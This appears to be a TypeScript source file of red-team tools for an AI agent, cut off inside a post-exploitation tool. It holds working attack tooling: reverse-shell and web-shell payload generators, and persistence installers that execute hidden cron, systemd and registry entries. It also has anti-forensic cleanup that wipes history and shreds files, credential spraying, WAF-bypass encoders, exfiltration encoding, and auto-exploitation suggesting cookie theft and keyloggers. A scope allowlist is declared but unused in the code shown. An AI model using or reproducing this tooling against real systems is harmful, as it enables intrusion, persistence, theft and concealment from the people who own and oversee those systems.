import {
	type AgentTool,
	createTool,
	validateWithZod,
	zodToJsonSchema,
} from "@cline/shared";
import { z } from "zod";
import { createOobServer, type OobServer } from "./oob-server";
import { createSquadDeployment, RED_TEAM_ROLES } from "./redteam-team";
import type { StealthMiddleware } from "./stealth";

const StealthConfigSchema = z.object({
	proxies: z.array(z.string()).optional(),
	userAgents: z.array(z.string()).optional(),
	jitterMinMs: z.number().int().nonnegative().optional(),
	jitterMaxMs: z.number().int().nonnegative().optional(),
	rateLimitRps: z.number().int().nonnegative().optional(),
	wafEvasion: z.boolean().optional(),
	headerRandomization: z.boolean().optional(),
});

const SubdomainEnumSchema = z.object({
	domain: z.string().min(1),
	wordlist: z.array(z.string()).optional(),
});

const HttpProbeSchema = z.object({
	url: z.string().min(1),
	method: z
		.enum(["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"])
		.optional(),
	headers: z.record(z.string(), z.string()).optional(),
	body: z.string().optional(),
	followRedirects: z.boolean().optional(),
});

const scopeAllowlist = new Set<string>();
let dryRunMode = false;
let killed = false;
let actionCount = 0;

import { CampaignManager } from "./campaign";
import { CommandFilter } from "./command-filter";
import { DockerMiddleware } from "./docker";
import type { SqlitePlanStore } from "./plan-store";
import { Supervisor } from "./supervisor";

export function createRedTeamTools(
	stealth: StealthMiddleware,
	docker?: DockerMiddleware,
	planStore?: SqlitePlanStore,
): AgentTool[] {
	const tools: AgentTool[] = [];

	tools.push(
		createTool<
			{
				proxies?: string[];
				userAgents?: string[];
				jitterMinMs?: number;
				jitterMaxMs?: number;
				rateLimitRps?: number;
				wafEvasion?: boolean;
				headerRandomization?: boolean;
			},
			{ ok: boolean; config: unknown }
		>({
			name: "rt_stealth_config",
			description:
				"Configure red team stealth layer: proxies, user agents, jitter, rate limit, WAF evasion.",
			inputSchema: zodToJsonSchema(StealthConfigSchema),
			execute: async (input) => {
				const v = validateWithZod(StealthConfigSchema, input);
				stealth.updateConfig(v);
				return { ok: true, config: stealth.getConfig() };
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			{ domain: string; wordlist?: string[] },
			{ subdomains: string[]; count: number }
		>({
			name: "rt_recon_subdomains",
			description:
				"Enumerate subdomains via crt.sh certificate transparency + DNS brute force.",
			inputSchema: zodToJsonSchema(SubdomainEnumSchema),
			execute: async (input) => {
				const v = validateWithZod(SubdomainEnumSchema, input);
				const found = new Set<string>();
				// crt.sh
				try {
					const { headers } = await stealth.preRequest();
					const res = await fetch(
						`https://crt.sh/?q=%25.${encodeURIComponent(v.domain)}&output=json`,
						{
							headers: stealth.buildHeaders(headers),
						},
					);
					if (res.ok) {
						const data = (await res.json()) as { name_value?: string }[];
						for (const entry of data ?? []) {
							const nv = entry?.name_value ?? "";
							for (const line of nv.split("\n")) {
								const name = line.trim().toLowerCase();
								if (name?.endsWith(v.domain) && !name.startsWith("*")) {
									found.add(name);
								}
							}
						}
					}
				} catch {
					// ignore
				}
				// DNS brute with wordlist
				const wl = v.wordlist ?? [
					"www",
					"api",
					"app",
					"admin",
					"dev",
					"staging",
					"test",
					"mail",
					"vpn",
					"portal",
					"auth",
					"login",
					"dashboard",
					"cdn",
					"static",
					"assets",
					"blog",
					"shop",
					"store",
					"beta",
					"demo",
				];
				for (const w of wl) {
					const candidate = `${w}.${v.domain}`;
					try {
						await stealth.preRequest();
						// DNS resolution via fetch to a resolver endpoint (best-effort)
						const res = await fetch(
							`https://dns.google/resolve?name=${encodeURIComponent(candidate)}&type=A`,
						);
						if (res.ok) {
							const data = (await res.json()) as { Answer?: unknown[] };
							if (data?.Answer && data.Answer.length > 0) found.add(candidate);
						}
					} catch {
						// ignore
					}
				}
				const list = [...found].sort();
				return { subdomains: list, count: list.length };
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			{
				url: string;
				method?: string;
				headers?: Record<string, string>;
				body?: string;
				followRedirects?: boolean;
			},
			{
				status: number;
				headers: Record<string, string>;
				body: string;
				redirected: boolean;
				finalUrl: string;
			}
		>({
			name: "rt_http_probe",
			description:
				"HTTP probe with stealth headers, proxy rotation, and WAF evasion. Returns status, headers, body.",
			inputSchema: zodToJsonSchema(HttpProbeSchema),
			execute: async (input) => {
				const v = validateWithZod(HttpProbeSchema, input);
				const { headers } = await stealth.preRequest();
				const finalHeaders = {
					...stealth.buildHeaders(headers),
					...(v.headers ?? {}),
				};
				const res = await fetch(v.url, {
					method: v.method ?? "GET",
					headers: finalHeaders,
					body: v.body,
					redirect: v.followRedirects === false ? "manual" : "follow",
				});
				const body = await res.text();
				const respHeaders: Record<string, string> = {};
				res.headers.forEach((val, key) => {
					respHeaders[key] = val;
				});
				return {
					status: res.status,
					headers: respHeaders,
					body: body.slice(0, 20000),
					redirected: res.redirected,
					finalUrl: res.url,
				};
			},
		}) as AgentTool,
	);

	// --- Phase 2: recon extensions ---

	const PortScanSchema = z.object({
		host: z.string().min(1),
		ports: z.array(z.number().int().positive()).optional(),
		timeoutMs: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ host: string; ports?: number[]; timeoutMs?: number },
			{ open: { port: number; banner?: string }[] }
		>({
			name: "rt_recon_ports",
			description: "TCP port scan with banner grabbing. Default common ports.",
			inputSchema: zodToJsonSchema(PortScanSchema),
			execute: async (input) => {
				const v = validateWithZod(PortScanSchema, input);
				const ports = v.ports ?? [
					21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379,
					8080, 8443, 9200,
				];
				const timeout = v.timeoutMs ?? 3000;
				const open: { port: number; banner?: string }[] = [];
				const net = await import("node:net");
				for (const port of ports) {
					await stealth.preRequest();
					const result = await new Promise<{ open: boolean; banner?: string }>(
						(resolve) => {
							const socket = new net.Socket();
							let banner = "";
							socket.setTimeout(timeout);
							socket.on("connect", () => {
								socket.write("\r\n");
							});
							socket.on("data", (d: Buffer) => {
								banner += d.toString("utf8").slice(0, 200);
							});
							socket.on("timeout", () => {
								socket.destroy();
								resolve({ open: false });
							});
							socket.on("error", () => {
								socket.destroy();
								resolve({ open: false });
							});
							socket.on("close", () => {
								if (banner) resolve({ open: true, banner });
							});
							socket.connect(port, v.host);
							setTimeout(() => {
								if (!socket.destroyed) {
									socket.destroy();
									resolve({ open: true, banner: banner || undefined });
								}
							}, timeout);
						},
					);
					if (result.open) open.push({ port, banner: result.banner });
				}
				return { open };
			},
		}) as AgentTool,
	);

	const DirBruteSchema = z.object({
		baseUrl: z.string().min(1),
		wordlist: z.array(z.string()).optional(),
		statusFilter: z.array(z.number().int()).optional(),
	});
	tools.push(
		createTool<
			{ baseUrl: string; wordlist?: string[]; statusFilter?: number[] },
			{ found: { path: string; status: number; size: number }[] }
		>({
			name: "rt_recon_dirs",
			description: "Directory/file brute-force against a base URL.",
			inputSchema: zodToJsonSchema(DirBruteSchema),
			execute: async (input) => {
				const v = validateWithZod(DirBruteSchema, input);
				const wl = v.wordlist ?? [
					"admin",
					"login",
					"api",
					"config",
					".env",
					"robots.txt",
					"sitemap.xml",
					"backup",
					"test",
					"dev",
					"staging",
					"dashboard",
					"panel",
					"console",
					"swagger",
					"openapi",
					"graphql",
					"health",
					"status",
					"metrics",
				];
				const filter = v.statusFilter ?? [200, 204, 301, 302, 307, 401, 403];
				const base = v.baseUrl.replace(/\/$/, "");
				const found: { path: string; status: number; size: number }[] = [];
				for (const w of wl) {
					const path = w.startsWith("/") ? w : `/${w}`;
					try {
						const { headers } = await stealth.preRequest();
						const res = await fetch(`${base}${path}`, {
							method: "GET",
							headers: stealth.buildHeaders(headers),
							redirect: "manual",
						});
						if (filter.includes(res.status)) {
							const body = await res.text();
							found.push({ path, status: res.status, size: body.length });
						}
					} catch {
						// ignore
					}
				}
				return { found };
			},
		}) as AgentTool,
	);

	const TechFingerprintSchema = z.object({
		url: z.string().min(1),
	});
	tools.push(
		createTool<
			{ url: string },
			{
				technologies: string[];
				headers: Record<string, string>;
				server?: string;
				poweredBy?: string;
			}
		>({
			name: "rt_recon_tech",
			description:
				"Fingerprint tech stack from HTTP response headers and body.",
			inputSchema: zodToJsonSchema(TechFingerprintSchema),
			execute: async (input) => {
				const v = validateWithZod(TechFingerprintSchema, input);
				const { headers } = await stealth.preRequest();
				const res = await fetch(v.url, {
					method: "GET",
					headers: stealth.buildHeaders(headers),
					redirect: "follow",
				});
				const body = await res.text();
				const respHeaders: Record<string, string> = {};
				res.headers.forEach((val, key) => {
					respHeaders[key] = val;
				});
				const techs: string[] = [];
				const server = respHeaders.server;
				const poweredBy = respHeaders["x-powered-by"];
				if (server) techs.push(`server:${server}`);
				if (poweredBy) techs.push(`powered-by:${poweredBy}`);
				// framework hints
				const hints: [RegExp, string][] = [
					[/wp-content|wordpress/i, "WordPress"],
					[/django/i, "Django"],
					[/laravel/i, "Laravel"],
					[/react/i, "React"],
					[/vue/i, "Vue"],
					[/angular/i, "Angular"],
					[/next/i, "Next.js"],
					[/jquery/i, "jQuery"],
					[/bootstrap/i, "Bootstrap"],
					[/cloudflare/i, "Cloudflare"],
					[/nginx/i, "Nginx"],
					[/apache/i, "Apache"],
				];
				const combined = `${body} ${JSON.stringify(respHeaders)}`;
				for (const [re, name] of hints) {
					if (re.test(combined) && !techs.includes(name)) techs.push(name);
				}
				// cookie hints
				const setCookie = respHeaders["set-cookie"] ?? "";
				if (/phpsessid/i.test(setCookie)) techs.push("PHP");
				if (/jsessionid/i.test(setCookie)) techs.push("Java");
				if (/asp\.net/i.test(setCookie)) techs.push("ASP.NET");
				return { technologies: techs, headers: respHeaders, server, poweredBy };
			},
		}) as AgentTool,
	);

	// --- Phase 3: exploitation ---

	const VulnScanSchema = z.object({
		url: z.string().min(1),
		param: z.string().optional(),
	});
	tools.push(
		createTool<
			{ url: string; param?: string },
			{ findings: { type: string; payload: string; evidence: string }[] }
		>({
			name: "rt_vuln_scan",
			description:
				"Basic web vuln scan: XSS, SQLi, LFI via payload injection on a URL/param.",
			inputSchema: zodToJsonSchema(VulnScanSchema),
			execute: async (input) => {
				const v = validateWithZod(VulnScanSchema, input);
				const findings: { type: string; payload: string; evidence: string }[] =
					[];
				const param = v.param ?? "q";
				const base = v.url;
				const xssPayloads = [
					"<script>alert(1)</script>",
					'"><img src=x onerror=alert(1)>',
				];
				const sqliPayloads = ["'", "' OR '1'='1", "' UNION SELECT NULL--"];
				const lfiPayloads = [
					"../../../etc/passwd",
					"..\\..\\..\\windows\\win.ini",
				];
				const test = async (payload: string, type: string) => {
					try {
						const { headers } = await stealth.preRequest();
						const u = new URL(base);
						u.searchParams.set(param, payload);
						const res = await fetch(u.toString(), {
							headers: stealth.buildHeaders(headers),
						});
						const body = await res.text();
						if (type === "xss" && body.includes(payload)) {
							findings.push({
								type: "XSS",
								payload,
								evidence: "payload reflected unencoded",
							});
						}
						if (
							type === "sqli" &&
							/sql|syntax|mysql|postgres|ora-/i.test(body)
						) {
							findings.push({
								type: "SQLi",
								payload,
								evidence: "SQL error in response",
							});
						}
						if (type === "lfi" && /root:|\\[fonts\\]/i.test(body)) {
							findings.push({
								type: "LFI",
								payload,
								evidence: "file content leaked",
							});
						}
					} catch {
						// ignore
					}
				};
				for (const p of xssPayloads) await test(p, "xss");
				for (const p of sqliPayloads) await test(p, "sqli");
				for (const p of lfiPayloads) await test(p, "lfi");
				return { findings };
			},
		}) as AgentTool,
	);

	const PayloadGenSchema = z.object({
		type: z.enum([
			"revshell_bash",
			"revshell_python",
			"webshell_php",
			"webshell_jsp",
		]),
		host: z.string().min(1),
		port: z.number().int().positive(),
	});
	tools.push(
		createTool<
			{ type: string; host: string; port: number },
			{ payload: string }
		>({
			name: "rt_ref_payload_gen",
			description: "Generate common payloads (reverse shells, web shells).",
			inputSchema: zodToJsonSchema(PayloadGenSchema),
			execute: async (input) => {
				const v = validateWithZod(PayloadGenSchema, input);
				let payload = "";
				switch (v.type) {
					case "revshell_bash":
						payload = `bash -i >& /dev/tcp/${v.host}/${v.port} 0>&1`;
						break;
					case "revshell_python":
						payload = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${v.host}",${v.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
						break;
					case "webshell_php":
						payload = `<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>`;
						break;
					case "webshell_jsp":
						payload = `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`;
						break;
				}
				return { payload };
			},
		}) as AgentTool,
	);

	const CredSpraySchema = z.object({
		url: z.string().min(1),
		usernames: z.array(z.string()).min(1),
		passwords: z.array(z.string()).min(1),
		userField: z.string().optional(),
		passField: z.string().optional(),
	});
	tools.push(
		createTool<
			{
				url: string;
				usernames: string[];
				passwords: string[];
				userField?: string;
				passField?: string;
			},
			{ results: { username: string; password: string; status: number }[] }
		>({
			name: "rt_cred_spray",
			description: "Credential spraying against a login form URL.",
			inputSchema: zodToJsonSchema(CredSpraySchema),
			execute: async (input) => {
				const v = validateWithZod(CredSpraySchema, input);
				const uf = v.userField ?? "username";
				const pf = v.passField ?? "password";
				const results: {
					username: string;
					password: string;
					status: number;
				}[] = [];
				for (const u of v.usernames) {
					for (const p of v.passwords) {
						try {
							await stealth.preRequest();
							const body = new URLSearchParams({ [uf]: u, [pf]: p }).toString();
							const res = await fetch(v.url, {
								method: "POST",
								headers: {
									...stealth.buildHeaders(),
									"Content-Type": "application/x-www-form-urlencoded",
								},
								body,
								redirect: "manual",
							});
							results.push({ username: u, password: p, status: res.status });
						} catch {
							results.push({ username: u, password: p, status: 0 });
						}
					}
				}
				return { results };
			},
		}) as AgentTool,
	);

	// --- Phase 4: post-exploitation ---

	const ExfilEncodeSchema = z.object({
		data: z.string().min(1),
		method: z.enum(["base64", "hex", "url", "chunks"]).optional(),
		chunkSize: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ data: string; method?: string; chunkSize?: number },
			{ encoded: string | string[] }
		>({
			name: "rt_ref_exfil_encode",
			description: "Encode data for exfiltration (base64/hex/url/chunks).",
			inputSchema: zodToJsonSchema(ExfilEncodeSchema),
			execute: async (input) => {
				const v = validateWithZod(ExfilEncodeSchema, input);
				const method = v.method ?? "base64";
				if (method === "base64") {
					return { encoded: Buffer.from(v.data, "utf8").toString("base64") };
				}
				if (method === "hex") {
					return { encoded: Buffer.from(v.data, "utf8").toString("hex") };
				}
				if (method === "url") {
					return { encoded: encodeURIComponent(v.data) };
				}
				const size = v.chunkSize ?? 64;
				const buf = Buffer.from(v.data, "utf8");
				const chunks: string[] = [];
				for (let i = 0; i < buf.length; i += size) {
					chunks.push(buf.subarray(i, i + size).toString("base64"));
				}
				return { encoded: chunks };
			},
		}) as AgentTool,
	);

	const PivotSchema = z.object({
		type: z.enum(["ssh_tunnel", "socks", "port_forward"]),
		host: z.string().min(1),
		user: z.string().optional(),
		localPort: z.number().int().positive().optional(),
		remotePort: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{
				type: string;
				host: string;
				user?: string;
				localPort?: number;
				remotePort?: number;
			},
			{ command: string }
		>({
			name: "rt_ref_pivot",
			description:
				"Generate pivot/tunnel command (ssh tunnel, socks, port forward).",
			inputSchema: zodToJsonSchema(PivotSchema),
			execute: async (input) => {
				const v = validateWithZod(PivotSchema, input);
				const lp = v.localPort ?? 1080;
				const rp = v.remotePort ?? 80;
				let cmd = "";
				switch (v.type) {
					case "ssh_tunnel":
						cmd = `ssh -L ${lp}:localhost:${rp} ${v.user ? `${v.user}@` : ""}${v.host} -N -f`;
						break;
					case "socks":
						cmd = `ssh -D ${lp} ${v.user ? `${v.user}@` : ""}${v.host} -N -f`;
						break;
					case "port_forward":
						cmd = `ssh -L ${lp}:${v.host}:${rp} ${v.user ? `${v.user}@` : ""}${v.host} -N -f`;
						break;
				}
				return { command: cmd };
			},
		}) as AgentTool,
	);

	const PersistSchema = z.object({
		method: z.enum(["cron", "webshell_php", "service", "registry_run"]),
		payload: z.string().min(1),
		schedule: z.string().optional(),
	});
	tools.push(
		createTool<
			{ method: string; payload: string; schedule?: string },
			{ artifact: string; install: string }
		>({
			name: "rt_persist",
			description: "Generate persistence artifact + install command.",
			inputSchema: zodToJsonSchema(PersistSchema),
			execute: async (input) => {
				const v = validateWithZod(PersistSchema, input);
				let artifact = "";
				let install = "";
				switch (v.method) {
					case "cron":
						artifact = v.payload;
						install = `(crontab -l 2>/dev/null; echo "${v.schedule ?? "*/5 * * * *"} ${v.payload}") | crontab -`;
						break;
					case "webshell_php":
						artifact = v.payload;
						install = `echo '${v.payload}' > /var/www/html/.${Math.random().toString(36).slice(2)}.php`;
						break;
					case "service":
						artifact = v.payload;
						install = `cat > /etc/systemd/system/.svc.service <<'EOF'\n[Service]\nExecStart=${v.payload}\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable --now .svc`;
						break;
					case "registry_run":
						artifact = v.payload;
						install = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v svc /t REG_SZ /d "${v.payload}" /f`;
						break;
				}
				if (killed) return { artifact, install: "killed" };
				if (dryRunMode) return { artifact, install: "[dry-run]" };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					await promisify(exec)(install, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { artifact, install: "done" };
				} catch (e: unknown) {
					const err = e as { message?: string };
					return { artifact, install: err.message ?? "failed" };
				}
			},
		}) as AgentTool,
	);

	const CleanupSchema = z.object({
		paths: z.array(z.string()).optional(),
	});
	tools.push(
		createTool<
			{ paths?: string[] },
			{ commands: { cmd: string; stdout: string; code: number }[] }
		>({
			name: "rt_cleanup",
			description: "Generate cleanup commands to remove artifacts and traces.",
			inputSchema: zodToJsonSchema(CleanupSchema),
			execute: async (input) => {
				const v = validateWithZod(CleanupSchema, input);
				const cmds: string[] = [
					"history -c",
					"rm -f ~/.bash_history",
					"find /tmp -name '*.tmp' -delete",
				];
				for (const p of v.paths ?? []) {
					cmds.push(`rm -f ${p}`);
					cmds.push(`shred -u ${p} 2>/dev/null || true`);
				}
				if (killed)
					return {
						commands: cmds.map((c) => ({ cmd: c, stdout: "killed", code: -1 })),
					};
				if (dryRunMode)
					return {
						commands: cmds.map((c) => ({
							cmd: c,
							stdout: "[dry-run]",
							code: 0,
						})),
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const results: { cmd: string; stdout: string; code: number }[] = [];
				for (const cmd of cmds) {
					try {
						const { stdout } = await run(cmd, {
							timeout: 60000,
							maxBuffer: 10 * 1024 * 1024,
						});
						results.push({ cmd, stdout: stdout.slice(0, 100000), code: 0 });
					} catch (e: unknown) {
						const err = e as { stdout?: string; code?: number };
						results.push({
							cmd,
							stdout: (err.stdout ?? "").slice(0, 100000),
							code: err.code ?? 1,
						});
					}
				}
				return { commands: results };
			},
		}) as AgentTool,
	);

	// --- Phase 5: reporting ---

	const FindingLogSchema = z.object({
		title: z.string().min(1),
		severity: z.enum(["critical", "high", "medium", "low", "info"]),
		target: z.string().min(1),
		evidence: z.string().min(1),
		remediation: z.string().optional(),
	});
	tools.push(
		createTool<
			{
				title: string;
				severity: string;
				target: string;
				evidence: string;
				remediation?: string;
			},
			{ finding: unknown }
		>({
			name: "rt_finding_log",
			description:
				"Log a finding (returns structured finding for memory_store with kind=finding).",
			inputSchema: zodToJsonSchema(FindingLogSchema),
			execute: async (input) => {
				const v = validateWithZod(FindingLogSchema, input);
				const finding = {
					title: v.title,
					severity: v.severity,
					target: v.target,
					evidence: v.evidence,
					remediation: v.remediation,
					timestamp: new Date().toISOString(),
				};
				// Persist to findings.jsonl
				const { appendFileSync } = await import("node:fs");
				appendFileSync("findings.jsonl", `${JSON.stringify(finding)}\n`);
				return { finding, persisted: true };
			},
		}) as AgentTool,
	);

	const ReportGenSchema = z.object({
		title: z.string().min(1),
		findings: z.array(z.record(z.string(), z.unknown())),
	});
	tools.push(
		createTool<
			{ title: string; findings: Record<string, unknown>[] },
			{ report: string }
		>({
			name: "rt_report_gen",
			description: "Generate a markdown pentest report from findings.",
			inputSchema: zodToJsonSchema(ReportGenSchema),
			execute: async (input) => {
				const v = validateWithZod(ReportGenSchema, input);
				const lines: string[] = [
					`# ${v.title}`,
					"",
					`Generated: ${new Date().toISOString()}`,
					"",
				];
				const bySev: Record<string, number> = {};
				for (const f of v.findings) {
					const sev = String(f.severity ?? "info");
					bySev[sev] = (bySev[sev] ?? 0) + 1;
				}
				lines.push("## Summary");
				for (const [s, n] of Object.entries(bySev)) lines.push(`- ${s}: ${n}`);
				lines.push("", "## Findings");
				for (const [i, f] of v.findings.entries()) {
					lines.push(`### ${i + 1}. ${f.title ?? "Finding"}`);
					lines.push(`- **Severity:** ${f.severity ?? "info"}`);
					lines.push(`- **Target:** ${f.target ?? "n/a"}`);
					lines.push(`- **Evidence:** ${f.evidence ?? "n/a"}`);
					if (f.remediation) lines.push(`- **Remediation:** ${f.remediation}`);
					lines.push("");
				}
				const { writeFileSync } = await import("node:fs");
				const filename = `report-${Date.now()}.md`;
				writeFileSync(filename, lines.join("\n"));
				return { report: lines.join("\n"), file: filename, persisted: true };
			},
		}) as AgentTool,
	);

	// --- WAF bypass encoders ---

	const WafBypassSchema = z.object({
		payload: z.string().min(1),
		target: z.enum(["sqli", "xss", "lfi", "generic"]).optional(),
	});
	tools.push(
		createTool<
			{ payload: string; target?: string },
			{ variants: { name: string; payload: string }[] }
		>({
			name: "rt_ref_waf_bypass",
			description:
				"Generate WAF bypass variants of a payload (encoding, case, comments, HPP).",
			inputSchema: zodToJsonSchema(WafBypassSchema),
			execute: async (input) => {
				const v = validateWithZod(WafBypassSchema, input);
				const p = v.payload;
				const variants: { name: string; payload: string }[] = [];
				// URL encoding
				variants.push({ name: "url-encoded", payload: encodeURIComponent(p) });
				// Double URL encoding
				variants.push({
					name: "double-url-encoded",
					payload: encodeURIComponent(encodeURIComponent(p)),
				});
				// HTML entity encoding
				variants.push({
					name: "html-entities",
					payload: p.replace(/[<>&"']/g, (c) => `&#${c.charCodeAt(0)};`),
				});
				// Unicode escape
				variants.push({
					name: "unicode-escape",
					payload: p.replace(
						/./g,
						(c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`,
					),
				});
				// Case variation (SQL)
				variants.push({
					name: "case-variation",
					payload: stealth.evadeWaf(p),
				});
				// Comment injection (SQL)
				variants.push({
					name: "comment-injection",
					payload: p.replace(/ /g, "/**/"),
				});
				// Hex (0x) for SQL strings
				variants.push({
					name: "hex-string",
					payload: `0x${Buffer.from(p, "utf8").toString("hex")}`,
				});
				// Base64
				variants.push({
					name: "base64",
					payload: Buffer.from(p, "utf8").toString("base64"),
				});
				// HTTP parameter pollution (duplicate param)
				variants.push({
					name: "hpp",
					payload: `${p}&${p}`,
				});
				// Null byte
				variants.push({
					name: "null-byte",
					payload: `${p}%00`,
				});
				// Newline injection
				variants.push({
					name: "newline",
					payload: p.replace(/ /g, "%0a"),
				});
				return { variants };
			},
		}) as AgentTool,
	);

	// --- Multi-agent red team squad ---

	const SquadDeploySchema = z.object({
		target: z.string().min(1),
	});
	tools.push(
		createTool<{ target: string }, { deployment: unknown }>({
			name: "rt_ref_squad_deploy",
			description:
				"Deploy a multi-agent red team squad (recon, web attacker, exploit, stealth, reporter) for a target. Returns role definitions and coordination protocol.",
			inputSchema: zodToJsonSchema(SquadDeploySchema),
			execute: async (input) => {
				const v = validateWithZod(SquadDeploySchema, input);
				const deployment = createSquadDeployment(v.target);
				return { deployment };
			},
		}) as AgentTool,
	);

	const SquadRolesSchema = z.object({});
	tools.push(
		createTool<Record<string, never>, { roles: unknown[] }>({
			name: "rt_ref_squad_roles",
			description: "List red team squad role definitions.",
			inputSchema: zodToJsonSchema(SquadRolesSchema),
			execute: async () => {
				return { roles: RED_TEAM_ROLES };
			},
		}) as AgentTool,
	);

	// --- Autonomous exploitation ---

	const oobServers = new Map<string, OobServer>();

	const OobStartSchema = z.object({
		port: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ port?: number },
			{ id: string; port: number; url: string; token: string }
		>({
			name: "rt_oob_start",
			description:
				"Start an out-of-band callback server (HTTP) to catch blind SSRF/XXE/RCE callbacks.",
			inputSchema: zodToJsonSchema(OobStartSchema),
			execute: async (input) => {
				const v = validateWithZod(OobStartSchema, input);
				const srv = createOobServer();
				const id = `oob_${Date.now()}`;
				const info = await srv.start(v.port ?? 0);
				oobServers.set(id, srv);
				return { id, port: info.port, url: info.url, token: info.token };
			},
		}) as AgentTool,
	);

	const OobPollSchema = z.object({
		id: z.string().min(1),
	});
	tools.push(
		createTool<{ id: string }, { callbacks: unknown[]; count: number }>({
			name: "rt_oob_poll",
			description: "Poll OOB server for received callbacks.",
			inputSchema: zodToJsonSchema(OobPollSchema),
			execute: async (input) => {
				const v = validateWithZod(OobPollSchema, input);
				const srv = oobServers.get(v.id);
				if (!srv) return { callbacks: [], count: 0 };
				const cbs = srv.getCallbacks();
				return { callbacks: cbs, count: cbs.length };
			},
		}) as AgentTool,
	);

	const OobStopSchema = z.object({
		id: z.string().min(1),
	});
	tools.push(
		createTool<{ id: string }, { stopped: boolean }>({
			name: "rt_oob_stop",
			description: "Stop an OOB callback server.",
			inputSchema: zodToJsonSchema(OobStopSchema),
			execute: async (input) => {
				const v = validateWithZod(OobStopSchema, input);
				const srv = oobServers.get(v.id);
				if (srv) {
					srv.stop();
					oobServers.delete(v.id);
				}
				return { stopped: true };
			},
		}) as AgentTool,
	);

	const AutoExploitSchema = z.object({
		type: z.enum(["sqli", "xss", "lfi", "ssrf", "rce"]),
		url: z.string().min(1),
		param: z.string().optional(),
		oobUrl: z.string().optional(),
	});
	tools.push(
		createTool<
			{ type: string; url: string; param?: string; oobUrl?: string },
			{ success: boolean; evidence: string; nextSteps: string[] }
		>({
			name: "rt_auto_exploit",
			description:
				"Autonomously attempt exploitation of a confirmed vulnerability. Returns success/evidence/next steps.",
			inputSchema: zodToJsonSchema(AutoExploitSchema),
			execute: async (input) => {
				const v = validateWithZod(AutoExploitSchema, input);
				const param = v.param ?? "q";
				const nextSteps: string[] = [];
				let success = false;
				let evidence = "";
				try {
					const { headers } = await stealth.preRequest();
					const u = new URL(v.url);
					if (v.type === "sqli") {
						u.searchParams.set(param, "' OR '1'='1");
						const res = await fetch(u.toString(), {
							headers: stealth.buildHeaders(headers),
						});
						const body = await res.text();
						if (/welcome|admin|dashboard|logged/i.test(body)) {
							success = true;
							evidence = "SQLi auth bypass succeeded";
							nextSteps.push(
								"Extract database schema",
								"Dump credentials",
								"Pivot to admin panel",
							);
						} else {
							evidence = "SQLi probe did not confirm bypass";
							nextSteps.push(
								"Try UNION-based extraction",
								"Try blind SQLi with time delays",
							);
						}
					} else if (v.type === "xss") {
						u.searchParams.set(
							param,
							"<script>alert(document.domain)</script>",
						);
						const res = await fetch(u.toString(), {
							headers: stealth.buildHeaders(headers),
						});
						const body = await res.text();
						if (body.includes("<script>alert")) {
							success = true;
							evidence = "XSS payload reflected unencoded";
							nextSteps.push(
								"Craft phishing payload",
								"Steal session cookies",
								"Keylogger injection",
							);
						} else {
							evidence = "XSS not reflected — try WAF bypass variants";
							nextSteps.push("Use rt_waf_bypass", "Try DOM-based XSS");
						}
					} else if (v.type === "lfi") {
						u.searchParams.set(param, "../../../etc/passwd");
						const res = await fetch(u.toString(), {
							headers: stealth.buildHeaders(headers),
						});
						const body = await res.text();
						if (/root:.*:0:0:/i.test(body)) {
							success = true;
							evidence = "LFI confirmed — /etc/passwd readable";
							nextSteps.push(
								"Read config files",
								"Read SSH keys",
								"Read application source",
							);
						} else {
							evidence = "LFI not confirmed";
							nextSteps.push(
								"Try null byte",
								"Try php://filter",
								"Try path traversal variants",
							);
						}
					} else if (v.type === "ssrf") {
						if (!v.oobUrl) {
							evidence = "SSRF requires oobUrl (use rt_oob_start)";
							nextSteps.push("Start OOB server", "Inject OOB URL in param");
						} else {
							u.searchParams.set(param, v.oobUrl);
							await fetch(u.toString(), {
								headers: stealth.buildHeaders(headers),
							});
							evidence = "SSRF payload sent — check OOB server for callback";
							nextSteps.push(
								"Poll OOB server (rt_oob_poll)",
								"If callback received, SSRF confirmed",
							);
						}
					} else if (v.type === "rce") {
						u.searchParams.set(param, "; id");
						const res = await fetch(u.toString(), {
							headers: stealth.buildHeaders(headers),
						});
						const body = await res.text();
						if (/uid=\d+/i.test(body)) {
							success = true;
							evidence = "RCE confirmed — command output in response";
							nextSteps.push(
								"Establish reverse shell",
								"Run rt_payload_gen",
								"Post-exploitation enumeration",
							);
						} else {
							evidence = "RCE not confirmed";
							nextSteps.push(
								"Try command separators (;, |, &, newline)",
								"Try blind RCE via time delay",
							);
						}
					}
				} catch (e) {
					evidence = `Error: ${e instanceof Error ? e.message : String(e)}`;
				}
				return { success, evidence, nextSteps };
			},
		}) as AgentTool,
	);

	const PostExploitSchema = z.object({
		target: z.string().min(1),
		platform: z.enum(["linux", "windows"]).optional(),
	});
	tools.push(
		createTool<
			{ target: string; platform?: string },
			{ commands: { phase: string; cmd: string }[] }
		>({
			name: "rt_post_exploit_enum",
			description:
				"Generate post-exploitation enumeration commands for a compromised host.",
			inputSchema: zodToJsonSchema(PostExploitSchema),
			execute: async (input) => {
				const v = validateWithZod(PostExploitSchema, input);
				const isWin = v.platform === "windows";
				const commands: { phase: string; cmd: string }[] = [];
				if (isWin) {
					commands.push(
						{ phase: "identity", cmd: "whoami /all" },
						{ phase: "network", cmd: "ipconfig /all && netstat -ano" },
						{
							phase: "users",
							cmd: "net user && net localgroup administrators",
						},
						{ phase: "processes", cmd: "tasklist /v" },
